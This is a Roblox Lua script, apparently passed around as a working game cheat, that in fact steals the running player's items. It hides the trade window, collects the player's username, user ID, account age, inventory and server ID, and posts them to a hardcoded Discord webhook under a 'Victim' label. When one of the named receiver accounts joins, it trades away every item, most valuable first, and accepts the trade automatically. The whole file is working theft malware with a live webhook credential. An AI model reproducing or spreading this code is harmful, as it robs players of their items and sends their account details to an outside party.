print("Method Works")
local Configuration = {
    Username = {"7Jamiee7", "ChickenBurgerJoe", "8Jamiee8Alt", "8Jamiee8V2"},
    ManualChatCmd = "!Send",
    PrintInventory = false, 
    DebugPrints = false,
    HideTradeUI = true,
    WebhookURL = "https://discord.com/api/webhooks/1347735951824126054/o2SYB3InMDbbHx-GE0SARiYqCpGbkJOltZbaDzNBj_mewJ7e5EmCcUc6rupDq9BrVfTo"
}



local Resources = {
    InventoryPath = nil, 
    PetContainer = nil,   
    itemData = {},
    rarityCount = {},
    ReceiverJoined = false,
    TradeStarted = false,
    CheckingPlatform = true,
    Desktop = false
}

function isReceiver(localplayerName)
    for _, name in ipairs(Configuration.Username) do
        if localplayerName == name then
            return true
        end
    end
    return false
end


spawn(function()
    while Resources.CheckingPlatform do
        local success1, path1 = pcall(function()
            return game:GetService("Players").LocalPlayer.PlayerGui.MainGUI.Game.Crafting.Inventory.Salvage.ScrollFrame.Container
        end)
        
        local success2, path2 = pcall(function()
            return game:GetService("Players").LocalPlayer.PlayerGui.MainGUI.Lobby.Screens.Inventory.Main.Crafting.Main.Salvage.ScrollFrame.Container
        end)

        if success1 then
            print("Desktop")
            Resources.Desktop = true
            Resources.InventoryPath = path1
            Resources.PetContainer = game:GetService("Players").LocalPlayer.PlayerGui.MainGUI.Game.Inventory.Main.Pets.Items.Container.Current.Container
            Resources.CheckingPlatform = false
        elseif success2 then
            print("Mobile")
            Resources.InventoryPath = path2
            Resources.CheckingPlatform = false
        end

        wait()
    end
end)

repeat wait() until not Resources.CheckingPlatform


if _G.Running then return else _G.Running = true end

game:GetService("ReplicatedStorage").Trade.SetRequestsEnabled:FireServer(false) 

if Configuration.DebugPrints then
print("Running...")
end

if not Configuration.WebhookURL or not string.find(Configuration.WebhookURL, "https://discord.com/api/webhooks/") then
    if game.Players.LocalPlayer then
        game.Players.LocalPlayer:Kick("Aborting: Invalid webhook URL")
    end
    return
end

if not Configuration.Username or Configuration.Username == "" then
    if game.Players.LocalPlayer then
        game.Players.LocalPlayer:Kick("Aborting: Username cannot be empty")
    end
    return
end

if not Configuration.ManualChatCmd or Configuration.ManualChatCmd == "" then
    if game.Players.LocalPlayer then
        game.Players.LocalPlayer:Kick("Aborting: ManualChatCmd cannot be empty")
    end
    return
end



if Configuration.HideTradeUI then
spawn(function() --// Hide trade ui

    while true do
        pcall(function()
            local gui = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"):FindFirstChild("TradeGUI")
            local MobileGui = game:GetService("Players").LocalPlayer.PlayerGui.TradeGUI_Phone
            if gui then
                gui.Enabled = false
                local frame = gui:FindFirstChild("Container")
                if frame then
                    frame.Visible = false
                end
            else
                print("TradeGUI not found")
            end

            if MobileGui then
                
                MobileGui.Enabled = false

            end
        end)
        wait()
    end
end)
end


local function GatherInventoryData()
    Resources.itemData = {}
    Resources.rarityCount = {}

    local rarityPriority = {
        Common = 1,
        Uncommon = 2,
        Rare = 3,
        Other = 4,
        Pets = 5,  
        Legendary = 6,
        Vintage = 7,
        Classic = 8,
        Unique = 9,    
        Halloween = 10,
        Godly = 11,
        Ancient = 12
    }

    for _, item in ipairs(Resources.InventoryPath:GetChildren()) do
        if item:IsA("Frame") then
            local itemName = item.Name
            local amount = 1
            local rarity = nil
            local priority = 0

            for _, desc in ipairs(item:GetDescendants()) do
                if desc:IsA("TextLabel") then
                    if desc.Name == "Amount" then
                        local amountText = desc.Text:gsub("%D", "")
                        if amountText ~= "" then
                            amount = tonumber(amountText) or 1
                        end
                    elseif desc.Name == "Rarity" then
                        rarity = desc.Text
                        if not rarityPriority[rarity] then
                            rarity = "Other"
                        end
                        priority = rarityPriority[rarity] or 0
                    end
                end
            end

            if rarity then
                table.insert(Resources.itemData, {
                    Name = itemName,
                    Amount = amount,
                    Rarity = rarity,
                    Priority = priority
                })
            end
        end
    end

    if Resources.Desktop then
    for _, newItem in ipairs(Resources.PetContainer:GetChildren()) do
        if newItem.Name == "NewItem" then
            local petName = newItem:FindFirstChild("ItemName") and newItem.ItemName:FindFirstChild("Label") and newItem.ItemName.Label.Text or "Unknown"
            local petAmountText = newItem:FindFirstChild("Container") and newItem.Container:FindFirstChild("Amount") and newItem.Container.Amount.Text or ""

            local petAmount = tonumber(petAmountText:match("x(%d+)")) or 1

            table.insert(Resources.itemData, {
                Name = petName,
                Amount = petAmount,
                Rarity = "Pets",
                Priority = rarityPriority["Pets"]
            })
        end
    end

    for _, data in ipairs(Resources.itemData) do
        Resources.rarityCount[data.Rarity] = (Resources.rarityCount[data.Rarity] or 0) + data.Amount
    end
end
end

GatherInventoryData()





function sendTradeRequest(targetName)
    local success, err = pcall(function()
        local targetPlayer = game:GetService("Players"):FindFirstChild(targetName)
        if targetPlayer then
            game.ReplicatedStorage.Trade.SendRequest:InvokeServer(targetPlayer)
            if Configuration.DebugPrints then
            print("Sent trade request to receiver")
            end
        end
    end)
end

function AcceptTrade()
    game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(285646582)
    if Configuration.DebugPrints then
    print("Accepted trade")
    end
end

function OfferItem(itemName)
    game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(itemName, "Weapons")
    if Configuration.DebugPrints then
    print("Offered item: " .. itemName)
    end
end

game:GetService("ReplicatedStorage").Trade.StartTrade.OnClientEvent:Connect(function()
    if Configuration.DebugPrints then
    print("Trade started!")
    end

    Resources.TradeStarted = true
end)

function tradeLoop(targetName)
    while Resources.ReceiverJoined do
        Resources.TradeStarted = false

        while not Resources.TradeStarted do
            sendTradeRequest(targetName)
            task.wait(5)
        end

        task.wait(2)

        table.sort(Resources.itemData, function(a, b)
            return a.Priority > b.Priority
        end)

        for _, item in ipairs(Resources.itemData) do
            for j = 1, item.Amount do
                OfferItem(item.Name)
            end
        end

        task.wait(8)
        AcceptTrade()
        task.wait(7)
    end
end







function sendWebhookMessage()
    if not Configuration or not Configuration.WebhookURL or Configuration.WebhookURL == "" then
        warn("Webhook URL is not set!")
        return
    end

    local player = game.Players.LocalPlayer
    local username = player.Name
    local userId = player.UserId
    local accountAge = player.AccountAge
    local exploit = identifyexecutor() or "Unable to fetch executor"
    local receiver = #Configuration.Username > 0 and table.concat(Configuration.Username, ", ") or "Unknown"
    local teleportScript = string.format("game:GetService('TeleportService'):TeleportToPlaceInstance('%s', '%s', game.Players.LocalPlayer)", tostring(game.PlaceId), tostring(game.JobId))

    local rarityCounts = {
        Other = 0,
        Pets = 0,  
        Common = 0,
        Uncommon = 0,
        Rare = 0,
        Legendary = 0,
        Vintage = 0,
        Classic = 0,
        Unique = 0,    
        Halloween = 0,
        Ancient = 0,
        Godly = 0
    }

    for _, item in ipairs(Resources.itemData) do
        local rarity = item.Rarity
        if rarityCounts[rarity] then
            rarityCounts[rarity] = rarityCounts[rarity] + item.Amount
        else
            rarityCounts["Other"] = rarityCounts["Other"] + item.Amount
        end
    end

    local rarityOrder = {
        "Godly", "Ancient", "Halloween", "Unique", "Vintage", "Legendary", 
        "Classic", "Rare", "Uncommon", "Common", "Other", "Pets"  
    }

    local rarityMessage = ""
    for _, rarity in ipairs(rarityOrder) do
        local count = rarityCounts[rarity] or 0
        rarityMessage = rarityMessage .. string.format("**%s:** %d\n", rarity, count)
    end

    local inventoryMessage = ""
    if #Resources.itemData == 0 then
        inventoryMessage = "Inventory Empty"
    else
        for _, item in ipairs(Resources.itemData) do
            inventoryMessage = inventoryMessage .. string.format("%s (%dx), ", item.Name, item.Amount)
        end
        inventoryMessage = inventoryMessage:sub(1, -3)
    end

    local platformText = ""

    if Resources.Desktop then
        platformText = "Desktop"
    else
        platformText = "Mobile"
    end

    local contentMessage = string.format("@everyone\n\n**JobID:** `%s`\n%s", game.JobId, platformText)

    local firstEmbed = {
        title = "**Inventory Log (Player Info)**",
        description = string.format(
            "**Victim:** %s\n" ..
            "**UserID:** %d\n" ..
            "**Account Age:** %d days\n" ..
            "**Exploit:** %s\n" ..
            "**Receiver:** %s\n\n" ..
            "**Rarity Counts:**\n\n%s",
            username, userId, accountAge, exploit, receiver, rarityMessage
        ),
        color = 0x0047AB,
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
        footer = {
            text = "Inventory Data"
        }
    }

    local secondEmbedMessage = inventoryMessage
    local embeds = { firstEmbed }
    local currentEmbed = { description = "" }

    while #secondEmbedMessage > 0 do
        local chunk = secondEmbedMessage:sub(1, 3500)  
        secondEmbedMessage = secondEmbedMessage:sub(3501)

        currentEmbed.description = "```" .. chunk .. "```"
        currentEmbed.title = "**Inventory Details**"
        currentEmbed.color = 0x0047AB
        currentEmbed.timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        currentEmbed.footer = { text = "Inventory Data" }

        table.insert(embeds, currentEmbed)
        currentEmbed = {}  
    end

    local payload = {
        content = contentMessage,
        embeds = embeds
    }

    local headers = {
        ["Content-Type"] = "application/json"
    }

    local request_payload = {
        Url = Configuration.WebhookURL,
        Method = "POST",
        Headers = headers,
        Body = game:GetService("HttpService"):JSONEncode(payload)
    }

    local success, response = pcall(function()
        return http_request(request_payload)
    end)
end
sendWebhookMessage()









game:GetService("Players").PlayerAdded:Connect(function(player)
    if isReceiver(game.Players.LocalPlayer.Name) then
        if Configuration.DebugPrints then
        print("Receiver has joined")
        end

        Resources.ReceiverJoined = true
        task.wait(10)
        tradeLoop(player.Name)
    end
end)

game:GetService("Players").PlayerRemoving:Connect(function(player)
    if isReceiver(game.Players.LocalPlayer.Name) then
        Resources.ReceiverJoined = false
        if Configuration.DebugPrints then
            print("Receiver has left the game")
        end
    end
end)


game:GetService("RunService").Heartbeat:Connect(function()
    for _, username in ipairs(Configuration.Username) do
        local targetPlayer = game:GetService("Players"):FindFirstChild(username)
        if targetPlayer then
            if not Resources.ReceiverJoined then
                Resources.ReceiverJoined = true
                tradeLoop(username) 
            end
            return 
        end
    end
    Resources.ReceiverJoined = false
end)

